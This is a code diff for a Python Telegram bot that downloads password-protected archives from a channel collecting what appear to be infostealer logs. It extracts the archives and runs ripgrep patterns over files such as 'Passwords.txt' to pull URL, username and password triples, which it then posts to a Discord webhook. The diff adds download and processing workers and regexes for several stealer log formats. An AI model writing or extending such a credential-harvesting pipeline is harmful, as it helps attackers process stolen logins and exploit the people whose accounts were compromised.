@@ -16,7 +16,38 @@ load_dotenv()
 
 api_id = os.getenv("TELEGRAM_API_ID")
 api_hash = os.getenv("TELEGRAM_API_HASH")
-channel_id = -1001935880746 # channel that aggregates all the logs - has to stay the same for the bot to work, as its set up for their specific format - its static though so you dont have to worry about that
+channel_id = -1001713957406 # channel that aggregates all the logs - has to stay the same for the bot to work, as its set up for their specific format - its static though so you dont have to worry about that
+MAX_CONCURRENT_DOWNLOADS = 1 # change this to however many files you want to download at once if multiple are dropped at the same time, above 3 is where telegram starts to get pissy about it
+download_semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
+download_queue = asyncio.Queue()
+process_queue = asyncio.Queue()
+
+async def download_worker():
+    while True:
+        event, file_path, password = await download_queue.get()
+        try:
+            async with download_semaphore:
+                file_path = await event.message.download_media(file=file_path)
+                print(f'New file downloaded to {file_path}')
+                await process_queue.put((file_path, password))
+        except Exception as e:
+            print(f"Error downloading file: {e}")
+        finally:
+            download_queue.task_done()
+
+async def process_worker():
+    while True:
+        file_path, password = await process_queue.get()
+        try:
+            extract_path = os.path.splitext(file_path)[0]
+            os.makedirs(extract_path, exist_ok=True)
+            extract_file(file_path, extract_path, password)
+            os.remove(file_path)
+            shutil.rmtree(extract_path)
+        except Exception as e:
+            print(f"Error processing file {file_path}: {e}")
+        finally:
+            process_queue.task_done()
 
 client = TelegramClient('Session', api_id, api_hash)
 
@@ -94,6 +125,8 @@ def ingest_data(file_path, webhook_url):
 
 def extract_file(file_path, extract_path, password=None):
     file_extension = os.path.splitext(file_path)[1].lower()
+    errors = []
+
     try:
         if file_extension == '.zip':
             extract_zip(file_path, extract_path, password)
@@ -109,18 +142,40 @@ def extract_file(file_path, extract_path, password=None):
         
         rg_path = os.path.join(extract_path, 'rg.deb')
         os.chmod(rg_path, 0o755)
-        
-        cmd = 'rg -oUNI "URL:\\s(.*?)[|\\r]\\nUsername:\\s(.*?)[|\\r]\\nPassword:\\s(.*?)[|\\r]\\n" -r \'$1:$2:$3\' --glob-case-insensitive -g "Passwords.txt" > combined.txt'
-        subprocess.run(cmd, shell=True, cwd=extract_path, check=True)
-        
-        print(f"Executed rg command in {extract_path}")
-        
-        ingest_data(os.path.join(extract_path, 'combined.txt'), os.getnev('DISCORD_WEBHOOK_URL'))
-    
+
+        try:
+            cmd1 = 'rg -oUNI "URL:\\s(.*?)[|\\r]\\nUsername:\\s(.*?)[|\\r]\\nPassword:\\s(.*?)[|\\r]\\n" -r \'$1:$2:$3\' --glob-case-insensitive -g "Passwords.txt" > combined.txt'
+            subprocess.run(cmd1, shell=True, cwd=extract_path, check=True)
+            print(f"Executed 1st rg command in {extract_path}")
+        except subprocess.CalledProcessError as e:
+            print(f"Error executing 1st rg command: {e}")
+            errors.append(f"1st rg command failed: {e}")
+
+        try:
+            cmd2 = 'rg -oUNI "URL:\\s*(.*?)\\nUSER:\\s*(.*?)\\nPASS:\\s*(.*?)\\n" -r "$1:$2:$3" --glob-case-insensitive -g "All Passwords.txt" > combined.txt'
+            subprocess.run(cmd2, shell=True, cwd=extract_path, check=True)
+            print(f"Executed 2nd rg command in {extract_path}")
+        except subprocess.CalledProcessError as e:
+            print(f"Error executing 2nd rg command: {e}")
+            errors.append(f"2nd rg command failed: {e}")
+
+        try:
+            cmd3 = 'rg -oUNI "url:\\s*(.*?)\\nlogin:\\s*(.*?)\\npassword:\\s*(.*?)\\n" -r "$1:$2:$3" --glob-case-insensitive -g "passwords.txt" > combined.txt'
+            subprocess.run(cmd3, shell=True, cwd=extract_path, check=True)
+            print(f"Executed 3rd rg command in {extract_path}")
+        except subprocess.CalledProcessError as e:
+            print(f"Error executing 3rd rg command: {e}")
+            errors.append(f"3rd rg command failed: {e}")
+
+        if len(errors) < 3:
+            print(f"Proceeding with data ingestion despite {len(errors)} error(s).")
+            ingest_data(os.path.join(extract_path, 'combined.txt'), os.getenv('DISCORD_WEBHOOK_URL'))
+        else:
+            print("Too many errors, skipping data ingestion.")
+            print("\n".join(errors))
+
     except zipfile.BadZipFile:
         print(f"Error: {file_path} is not a valid ZIP file.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error executing rg command: {e}")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
 
@@ -181,76 +236,70 @@ def recursive_extract(path, password=None):
                 else:
                     print(f"Unexpected error processing file {os.path.join(root, file)}: {e}")
 
-download_queue = asyncio.Queue()
-
-async def process_queue():
-    while True:
-        event, file_path, password = await download_queue.get()
-        try:
-            extract_path = os.path.splitext(file_path)[0]
-            os.makedirs(extract_path, exist_ok=True)
-            extract_file(file_path, extract_path, password)
-            os.remove(file_path)
-            shutil.rmtree(extract_path)
-        except Exception as e:
-            print(f"Error processing file {file_path}: {e}")
-        finally:
-            download_queue.task_done()
-
 async def handler(event):
     if event.message.media:
         chat_id = event.chat_id
         message_id = event.message.id
-
         message_link = f'tg://privatepost?channel={chat_id}&post={message_id}'
-
+        
         if event.message.file:
-            original_filename = event.message.file.name or f'message_{message_id}'
+            original_filename = event.message.file.name or f'message{message_id}'
+            file_size = event.message.file.size
         else:
-            original_filename = f'message_{message_id}'
-
-        valid_filename = original_filename.replace('/', '_').replace('\\', '_')
+            original_filename = f'message{message_id}'
+            file_size = 0 
+        
+        valid_filename = original_filename.replace('/', '').replace('\\', '_')
         valid_filename = unicodedata.normalize('NFKD', valid_filename)
-
+        
         try:
             valid_filename.encode('utf-8')
         except UnicodeEncodeError:
-            valid_filename = f'message_{message_id}'
-
-        if len(valid_filename) > 255:
-            valid_filename = valid_filename[:250] + f'_{message_id}'
-
-        message_text = event.message.message
-        print(message_text)
+            valid_filename = f'message{message_id}'
         
-        password_match = re.search(r'.pass: (.*?)(?:\n|$)', message_text, re.DOTALL)
+        if len(valid_filename) > 255:
+            valid_filename = valid_filename[:250] + f'{message_id}'
+        
+        message_text = event.message.message.strip() if event.message.message else ""
+        print(message_text)
+
+        password_match = re.search(r'password:\s*(.*)', message_text, re.DOTALL)
         password = password_match.group(1).strip() if password_match else None
 
-        if password == '➖':
+        if password == '?':
             password = None
-
+        
         print(f'Message link: {message_link}')
         print(f'Filename: {valid_filename}')
+        print(f'File size: {file_size / (1024 * 1024):.2f} MB')
+        
         if password:
             print(f'Password: {password}')
         else:
             print('No password found or password is ignored.')
-
-        file_path = await event.message.download_media(file=f'./{valid_filename}')
-        print(f'New file downloaded to {file_path}')
-
+        
+        file_path = f'./{valid_filename}'
         await download_queue.put((event, file_path, password))
 
 async def main():
     await client.start()
 
-    asyncio.create_task(process_queue())
+    workers = [
+        asyncio.create_task(download_worker()) for _ in range(MAX_CONCURRENT_DOWNLOADS)
+    ] + [
+        asyncio.create_task(process_worker()) for _ in range(MAX_CONCURRENT_DOWNLOADS)
+    ]
 
     @client.on(events.NewMessage(chats=channel_id))
     async def handler_wrapper(event):
         await handler(event)
 
-    await client.run_until_disconnected()
+    try:
+        await client.run_until_disconnected()
+    finally:
+        for worker in workers:
+            worker.cancel()
+        await asyncio.gather(*workers, return_exceptions=True)
 
 with client:
     client.loop.run_until_complete(main())
